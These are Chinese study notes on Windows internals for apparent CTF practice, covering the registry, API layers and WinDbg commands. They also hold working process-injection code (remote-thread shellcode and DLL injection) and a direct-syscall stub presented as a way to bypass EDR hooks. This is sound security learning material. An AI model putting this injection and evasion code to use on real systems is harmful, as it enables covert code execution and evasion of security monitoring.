

## 概念

linux 迁移：
- 项目 Linux - Windows
- 抽象 文件 - 对象
- 手册文档 man - MSDN
- 动态调试 GDB - WinDBG, x64dbg
    - 调试方式 ptrace 系统调用 - OpenProcess/VirtualAllocEx/WriteProcessMemory/CreateRemoteThread 线程注入
    - 调试权限 管理员 - 当前用户运行的所有进程
- 终端 Bash - Powershell
- 追踪 Strace - Procmon 
- 二进制文件 ELF - PE
- 共享库 .so - .DLL
- 管理员权限 root - SYSTEM
- 程序属性 NX - DEP
- 配置文件 - 注册表
- 空间随机 ASLR 每次**程序**启动时随机 - **系统**启动后随机1次复用地址
- 页对齐对静态动态地址 0x1000 的低3半字节相同 - 0x10000 的低4半字节相同
- 栈金丝雀 程序启动随机1次后金丝雀值固定复用 - 程序启动随机1次后每个函数使用此固定随机值与 rsp 异或作为金丝雀
- 输出文件到终端 cat - type
- 打开/读取/打印 open/read/write - CreateFileA/ReadFile/WriteFile

文件后缀区分类型

程序调试信息保存在单独的文件中 `.pdb`

注册表：
- [注册表](https://learn.microsoft.com/zh-cn/windows/win32/sysinfo/registry)
- [面向高级用户的 Windows 注册表信息](https://learn.microsoft.com/zh-cn/troubleshoot/windows-server/performance/windows-registry-advanced-users)
    - `HKEY_LOCAL_MACHINE`	
        包含特定于计算机（针对任何用户）的配置信息。 此项有时缩写为 HKLM。
    - `HKEY_CURRENT_USER`	
        包含当前登录用户的配置信息的根目录。 用户的文件夹、屏幕颜色和控制面板设置存储在此处。 此信息与用户的配置文件相关联。 此项有时缩写为 HKCU。
- 工具：
    - 编辑：注册表编辑器(Regedit.exe 或 Regedt32.exe)、组策略、系统策略、注册表 (.reg) 文件或运行 VisualBasic 脚本文件等脚本
    - Procmon 实时追踪
    - 句柄 `handle.exe`

[安全标识符 SID](https://learn.microsoft.com/zh-cn/windows-server/identity/ad-ds/manage/understand-security-identifiers?source=recommendations)

[创建进程](https://learn.microsoft.com/zh-cn/windows/win32/procthread/creating-processes)

### API

1. 用户函数
2. KERNEL32.DLL
    ```c++
    // 直接调用 KERNEL32 库函数
    HANDLE flag_handle = CreateFileA("\\\\.\\pipe\\LOCAL\\FlagPipe", GENERIC_READ, 0, nullptr,  OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    ```
3. KERNELBASE.dll
    ```c++
    // 在 KERNELBASE 模块中查找函数地址后，由于参数相同，仅转为函数指针调用
    typedef HANDLE (WINAPI *CreateFileA_func)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);

    CreateFileA_func CreateFileA_KB = (CreateFileA_func)GetProcAddress(GetModuleHandleA("KERNELBASE.dll"), "CreateFileA");

    HANDLE flag_handle = CreateFileA_KB("\\\\.\\pipe\\LOCAL\\FlagPipe", GENERIC_READ, 0, nullptr,  OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    ```
4. ntdll.dll

    - 在 ntdll 模块查找目标函数地址并调用
        ```c++
        // 获取文件句柄：nt CreateFile 定义，之后获取地址
        typedef NTSTATUS (NTAPI* CreateFile_NT_func)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID,ULONG);
        CreateFile_NT_func CreateFile_NT;

        // 设置 unicode 结构：nt RtlInitUnicodeString 定义，之后获取地址
        typedef  VOID (NTAPI* RtlInitUnicodeString_NT_func)(PUNICODE_STRING, PCWSTR);
        RtlInitUnicodeString_NT_func RtlInitUnicodeString_NT;

        // CreateFile 包装函数，返回句柄
        HANDLE CreateFile_wrap(const wchar_t* file_str, ULONG CreateDisposition){
            // 设置字符串路径到 unicode 结构
            UNICODE_STRING file_path = {0};
            RtlInitUnicodeString_NT(&file_path, file_str);
            // 使用字符串 unicode 结构，设置对象属性
            _OBJECT_ATTRIBUTES ObjectAttributes;
            InitializeObjectAttributes(
                &ObjectAttributes, 
                &file_path,
                OBJ_CASE_INSENSITIVE,
                NULL,
                NULL
            );
            
            // 调用 nt CreateFile 函数，注意读写必有同步 flag
            IO_STATUS_BLOCK IoStatusBlock;
            HANDLE FileHandle;
            CreateFile_NT(
                    &FileHandle,   // out 文件句柄指针
                    FILE_GENERIC_READ | FILE_GENERIC_WRITE | SYNCHRONIZE, // 访问 mask，读写与同步
                    &ObjectAttributes, // 文件结构，包含文件路径字符串
                    &IoStatusBlock, // out 完成状态
                    NULL,   // 文件初始大小
                    FILE_ATTRIBUTE_NORMAL, // 文件属性
                    FILE_SHARE_READ | FILE_SHARE_WRITE, // 共享模式
                    CreateDisposition, // 打开模式，参数传入
                    FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, // 打开文件选项，非目录与同步
                    NULL, // 扩展属性缓冲区
                    0 // 扩展缓冲区长度
            );
            return FileHandle;
        }

        // 设置全局变量 nt 函数地址
        CreateFile_NT = (CreateFile_NT_func)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateFile");
        RtlInitUnicodeString_NT = (RtlInitUnicodeString_NT_func)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");

        // 打开管道句柄
        HANDLE flag_handle = CreateFile_wrap(L"\\Device\\NamedPipe\\LOCAL\\FlagPipe", FILE_OPEN);

        // 打开文件句柄
        HANDLE copy_handle = CreateFile_wrap(L"\\??\\C:\\Users\\hacker\\saved_data", FILE_OVERWRITE_IF);
        ```
    
    - stub syscall 稍微修改 ntdll 的代码
        - cdb 查看原始 ntdll 的系统调用指令，此时 EDR 还未注入 hook:
            ```asm
            0:000> uf ntdll!NtCreateFile     
            ntdll!ZwCreateFile:
            00007ffa`47c4f980 4c8bd1          mov     r10,rcx
            00007ffa`47c4f983 b855000000      mov     eax,55h
            00007ffa`47c4f988 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
            00007ffa`47c4f990 7503            jne     ntdll!ZwCreateFile+0x15 (00007ffa`47c4f995)

            ntdll!ZwCreateFile+0x12:
            00007ffa`47c4f992 0f05            syscall
            00007ffa`47c4f994 c3              ret

            ntdll!ZwCreateFile+0x15:
            00007ffa`47c4f995 cd2e            int     2Eh
            00007ffa`47c4f997 c3              ret
            ```

        - 在 stub.S 的 .text 可执行段，构建最小系统调用:
            ```asm
            .intel_syntax noprefix
            .global NtCreateFile_syscall
            .text

            NtCreateFile_syscall:
                mov r10, rcx
                mov eax, 0x55
                syscall
                ret
            ```

        - payload.cpp（类型/参数）与 stub.S（系统调用）同时编译，:
            ```c++
            // 设置之后编译导入的汇编字段名
            extern "C" NTSTATUS NtCreateFile_syscall(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID,ULONG);

            // 将 ntdll 包装函数中 dll 模块中函数的地址修改为
            HANDLE CreateFile_wrap(const wchar_t* file_str, ULONG CreateDisposition){
                ...
                NtCreateFile_syscall( // dll stub
                // CreateFile_NT( // ntdll
                ...
            ```
        - ❓其他方式为数组写入汇编字节后强制类型转换为函数指针使用
5. 内核

### 注入

注入
- 附加线程执行 shellcode: 
    - OpenProcess 得到目标进程句柄
    - VirtualAllocEx 设置远程内存，权限 RWX 执行 shellcode 指令码
    - WriteProcessMemory 写入 shellcode 指令码
    - CreateRemoteThread 线程执行起始地址为 shellcode 写入地址

    ```c++
    // OpenProcess 打开目标进程句柄
    DWORD dwProcessId = 4832;
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    printf("hProcess %lx\n", hProcess);

    // VirtualAllocEx 设置目标进程内存 RWX
    LPVOID lpAddress = (LPVOID)0x1330000;
    LPVOID mmap_ptr = VirtualAllocEx(hProcess, lpAddress, 0x1000, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    printf("mmap_ptr %p\n", mmap_ptr);

    // WriteProcessMemory 将 shellcode 写入目标进程内存
    char shell_code[0x200];
    int fd = open("Z://payload.bin", O_RDONLY);
    int payload_len = read(fd, shell_code, 0x200);  
    printf("payload_len %lx\n", payload_len);
    close(fd);
    size_t nSize;
    WriteProcessMemory(hProcess, mmap_ptr, shell_code, payload_len, &nSize);
    printf("nSize %lx\n", nSize);

    // CreateRemoteThread 在目标进程中创建附加线程并执行指令
    LPTHREAD_START_ROUTINE lpStartAddress = (LPTHREAD_START_ROUTINE)mmap_ptr;
    DWORD lpThreadId;
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, lpStartAddress, NULL, 0, &lpThreadId);
    printf("hThread %lx\n", hThread);
    ```

- 附加线程载入 dll 库: 
    - OpenProcess 得到目标进程句柄
    - VirtualAllocEx 设置远程内存，权限 RW 加载 dll
    - WriteProcessMemory 写入 dll 路径，之后作为参数
    - CreateRemoteThread 线程执行起始地址为加载库函数 LoadLibrary 的地址
        - LoadLibrary 使用参数1的 dll 路径加载 dll 模块
    - dll 模块 DllMain 初始化，DllMain 中即可设置简单操作。但实际上立即返回，并在模块中导出载荷函数
    - 注入器获取载荷函数地址
        - 获取目标进程运行时模块地址
            - CreateToolhelp32Snapshot 获得目标进程快照
            - Module32First 第一个模块
            - Module32Next 多次遍历下一个模块
            - 找到目标模块并返回地址
        - 计算本地进程库中函数偏移
            - LoadLibraryA 加载并获得模块基址
            - GetProcAddress 获得函数地址
            - 计算相对偏移
    - CreateRemoteThread 起始地址为载荷函数地址

    注入器：
    ```c++
    // 获取目标进程模块信息
    size_t target_mod_info(DWORD dwProcessId, char* payload_mod_name){

        // 获得目标进程模块快照句柄
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, dwProcessId);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            // 打印错误
            printf("CreateToolhelp32Snapshot error\n");
        }

        // 得到第一个模块信息
        MODULEENTRY32 lpme;
        lpme.dwSize = sizeof(lpme);
        BOOL statue = Module32First(hSnapshot, &lpme);

        while(statue){
            // 打印模块信息
            printf("\n\n     MODULE NAME:     %s",   lpme.szModule );
            printf("\n     Executable     = %s",     lpme.szExePath );
            printf("\n     Process ID     = 0x%08X",         lpme.th32ProcessID );
            printf("\n     Ref count (g)  = 0x%04X",     lpme.GlblcntUsage );
            printf("\n     Ref count (p)  = 0x%04X",     lpme.ProccntUsage );
            printf("\n     Base address   = 0x%08p",    lpme.modBaseAddr );
            printf("\n     Base size      = %d",             lpme.modBaseSize );

            if(strcmp(payload_mod_name, lpme.szModule) == 0){
                // 找到目标模块后返回
                printf("\n >> find mod << \n");
                CloseHandle(hSnapshot);
                return (size_t)lpme.modBaseAddr;
            }
            // 继续遍历下一个模块
            statue = Module32Next(hSnapshot, &lpme);
        }
        
        CloseHandle(hSnapshot);
        return 0;
    }

    // 计算函数在库中的相对偏移
    size_t cal_local_mod_func_offset(char* dll_path, char* payload_mod_name, char* payload_func_name){
        // 加载库，得到库句柄，并且句柄值本身即为库基址
        HMODULE hModule = LoadLibraryA(dll_path);
        size_t local_mod_base = (size_t)hModule;
        printf("local_mod_base %p\n", local_mod_base);
        // 得到库中函数地址
        size_t local_fuc_addr = (size_t)GetProcAddress(hModule, payload_func_name);
        printf("local_fuc_addr %p\n", local_fuc_addr);
        // 计算函数在库中的相对偏移
        size_t local_mod_func_offset = local_fuc_addr - local_mod_base;
        printf("local_mod_func_offset %llx\n", local_mod_func_offset);
        return local_mod_func_offset;
    }

    // 退出状态调试函数
    int get_thread_exit_debug_info(HANDLE hThread){
        // 查看附加线程退出状态
        DWORD status = WaitForSingleObject(hThread, INFINITE);
        printf("status %llx\n", status);

        // 查看附加线程退出码
        DWORD exit_code;
        GetExitCodeThread(hThread, &exit_code);
        printf("exit_code %llx\n", exit_code);

        return 0;
    }

    int main(){
        // is_sus_mod 挂起模式或已运行进程
        // is_DllMain_mod DllMain 立即执行或导出外部函数后注入器执行

        DWORD dwProcessId; 
        HANDLE hProcess;
        // 分支：打开已存在的进程
        bool is_sus_mod = true;
        if(is_sus_mod == false){
            // 打开目标进程句柄
            dwProcessId = 4372;
            hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
            printf("hProcess %llx\n", hProcess);
        }
        // 分支：作为父进程挂起运行目标子进程

        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory( &si, sizeof(si) );
        si.cb = sizeof(si);
        ZeroMemory( &pi, sizeof(pi) );

        // Start the child process. 
        if( !CreateProcess( "C:\\challenge\\hello_world.exe",   // No module name (use command line)
            NULL,        // Command line
            NULL,           // Process handle not inheritable
            NULL,           // Thread handle not inheritable
            FALSE,          // Set handle inheritance to FALSE
            CREATE_SUSPENDED,              // 挂起创建
            NULL,           // Use parent's environment block
            NULL,           // Use parent's starting directory 
            &si,            // Pointer to STARTUPINFO structure
            &pi )           // Pointer to PROCESS_INFORMATION structure
        ) 
        {
            printf( "CreateProcess failed (%d).\n", GetLastError() );
            return -1;
        }

        hProcess = pi.hProcess;
        dwProcessId = pi.dwProcessId;

        // 设置目标进程内存 RW
        LPVOID lpAddress = (LPVOID)0x1330000;
        LPVOID mmap_ptr = VirtualAllocEx(hProcess, lpAddress, 0x1000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
        printf("mmap_ptr %p\n", mmap_ptr);

        // 将 dll 路径写入目标进程内存
        char dll_path[0x30]= {"C:\\Users\\hacker\\payload_dll.dll"};
        size_t nSize;
        WriteProcessMemory(hProcess, mmap_ptr, dll_path, sizeof(dll_path), &nSize);
        printf("nSize %llx\n", nSize);

        // LoadLibraryA(mmap_ptr) 在目标进程中创建附加线程并执行加载库函数
        LPTHREAD_START_ROUTINE lpStartAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
        printf("LoadLibraryA: %p\n", lpStartAddress);
        DWORD lpThreadId;
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, lpStartAddress, mmap_ptr, 0, &lpThreadId);

        get_thread_exit_debug_info(hThread);

        // 分支：在 dll 加载后立即在 DllMain 中执行
        bool is_DllMain_mod = false;
        if(is_DllMain_mod){
            if(is_sus_mod == true){
                // 若使用挂起模式则执行后恢复
                ResumeThread(pi.hThread);
                // 关闭句柄
                CloseHandle( pi.hProcess );
                CloseHandle( pi.hThread );
            }
            return 0;
        }
        // 分支：导出外部函数由注入器执行

        // 查找载荷模块与载荷函数地址
        char payload_mod_name[0x30] = {"payload_dll.dll"};
        char payload_func_name[0x30] = {"dll_payload_func"};
        size_t target_payload_mod_addr = target_mod_info(dwProcessId, payload_mod_name);
        size_t local_mod_func_offset = cal_local_mod_func_offset(dll_path, payload_mod_name, payload_func_name);
        size_t payload_func_addr = target_payload_mod_addr + local_mod_func_offset;
        printf("payload_func_addr %p\n", payload_func_addr);

        // 执行载荷函数
        LPTHREAD_START_ROUTINE lpStartAddress_payload_fuc = (LPTHREAD_START_ROUTINE)payload_func_addr;
        printf("lpStartAddress_payload_fuc: %p\n", lpStartAddress_payload_fuc);
        DWORD lpThreadId_payload_func;
        HANDLE hThread_payload_func = CreateRemoteThread(hProcess, NULL, 0, lpStartAddress_payload_fuc, NULL, 0, &lpThreadId_payload_func);

        get_thread_exit_debug_info(hThread_payload_func);

        if(is_sus_mod == true){
            // 若使用挂起模式则执行后恢复
            ResumeThread(pi.hThread);
            // 关闭句柄
            CloseHandle( pi.hProcess );
            CloseHandle( pi.hThread );
        }else{
            CloseHandle( hProcess );
        }

        return 0;
    }
    ```

    dll:
    ```c++
    // 导出载荷函数
    extern "C" __declspec(dllexport)
    DWORD WINAPI dll_payload_func(LPVOID){
        // 打开 flag 管道句柄
        HANDLE flag_handle = CreateFileA("\\\\.\\pipe\\LOCAL\\FlagPipe", GENERIC_READ, 0, nullptr,  OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);

        // 读取 flag 数据到栈并关闭句柄
        char the_buf[0x40] = {0};
        DWORD numberOfBytesRead;
        ReadFile(flag_handle, the_buf, sizeof(the_buf), &numberOfBytesRead, nullptr);
        CloseHandle(flag_handle);

        // 打开复制文件句柄
        HANDLE copy_handle = CreateFileA("C:\\Users\\hacker\\saved_flag", GENERIC_WRITE, 0, nullptr,  CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);

        // 复制栈中 flag 数据到复制文件句柄，并关闭句柄
        DWORD NumberOfBytesWritten;
        WriteFile(copy_handle, the_buf, numberOfBytesRead, &NumberOfBytesWritten, NULL);
        CloseHandle(copy_handle);
        
        return 0;
    }

    BOOL WINAPI DllMain(
        HINSTANCE hinstDLL,  // DLL 模块句柄
        DWORD fdwReason,     // 调用本函数的原因
        LPVOID lpvReserved ) // 保留参数
    {
        // 根据调用原因执行相应操作
        switch( fdwReason ) 
        { 
            case DLL_PROCESS_ATTACH:
            // 每个新进程初始化一次
            // 若返回 FALSE，DLL 加载失败
            
                // 分支：在 dll 加载后立即在 DllMain 中执行
                bool is_DllMain_mod = false;
                if(is_DllMain_mod){
                    dll_payload_func(nullptr);
                }
                // 分支：导出外部函数由注入器执行
                
                break;
        }
        return TRUE;  // DLL_PROCESS_ATTACH 成功
    }
    ```


数据
- 文件
- 管道
- 内存
- 线程退出码

附加进度控制
- 调试同步
    - cdb/windbg 调试器初始 int3 断点
        - 挂起恢复、冻结解冻
    - ❓DebugActiveProcess 写调试器附加到已存在进程
    - ❓IFEO Debugger `HKLM\...\Image File Execution Options\<image>\Debugger` 修改注册表启动截获
- CreateProcess/CREATE_SUSPENDED 创建挂起主线程的进程，此时执行注入器线程不被阻塞

dll
- 高级程序语言 .dll 设置函数声明/类型并调用函数，汇编语言 .S 设置直接函数调用入口
- 使用退出码传递调试信息
- 将各种数据写入文件作为日志查看


帮助函数：
- [遍历模块列表](https://learn.microsoft.com/zh-cn/windows/win32/toolhelp/traversing-the-module-list)

EDR：
- 注入器查看线程退出码，线程在各步骤的调用后设置独特退出码，以立即定位终止发生处
    - 或使用文件等其他数据传递方式确认当前进度
- hook.dll 附加到进程后修改用户态模块的函数入口指令，并劫持到 EDR 检测代码
    - ❓竞争条件
    - cdb 调试器初始断点时 hook 尚未加载


## 工具

- binary ninja
    似乎无法使用 .pdb 调试数据。
    解析文件时根据调用链可最终确认库函数调用，但过程中的函数无对应名称而需手动重命名。

- winobj - 图形化对象显示
- NtObjectManager - 访问 NT 对象管理器命名空间
- process explorer

### windbg（图形）/cdb(命令行)

windbg 在目标线程中设置调试线程，初始进入调试线程，或需切换线程到目标线程

设置
- 文件 - 设置 - 通用
    - 设置主题与字体

操作
- `Ctrl-滚轮` 缩放字体
- 拖动各种功能的窗口以调整布局

[指令](https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debuggercmds/commands)
- `dq` 打印8字节内存
    - `dq @REG` 打印解引用寄存器所指内存
    - `dq 全局符号 L90` 打印全局符号开始的90字节 
    - `df` 打印浮点
    - `dd` 打印4字节
    - `da`	ASCII 字符
- `ds、 dS` 将地址保存的值作为指针解引用后显示字符串
- `x` 打印符号值
- `lm` 列出模块信息
    - 点击模块链接到模块详情
        - 其中拥有3项 `Browse all global symbols`  `functions`  `data`
            - 点击 `functions` 列出模块的函数
                - 格式为 `模块名!函数名`

- `p` 逐步继续
- `t` 逐步跟踪进入
    - `tc` 继续到下一次 call 

- `bl` 列出断点
- `ba w1` 断点到地址1字节写入
- `g` 继续到断点
- `uf 模块名!函数名` 反汇编
- `r` 显示寄存器信息
- `?` 进入评估模式，可进行计算
- `k` 查看回溯调用信息
- `bu 地址或符号` 设置断点到地址或符号
- `~` 查看线程
    - `~0` 擦看线程0详情
    - `~0s` 附加到线程0
    - `~f` 冻结线程
    - `~u` 解冻线程
    - `~n` 挂起线程
    - `~m` 恢复线程
- `!address 地址` 查看地址信息
- `.attach 进程id`附加到进程
- `.detach` 从进程分离
- `.reload /f` 重新加载符号（之前默认不存在的库符号此时被加载）
- `!handle` 查看句柄
    - `!handle 0 f` 查看句柄详情
cdb:
- `-p 进程id` 附加到进程


目标：
- `x 函数!__security_cookie` 打印金丝雀

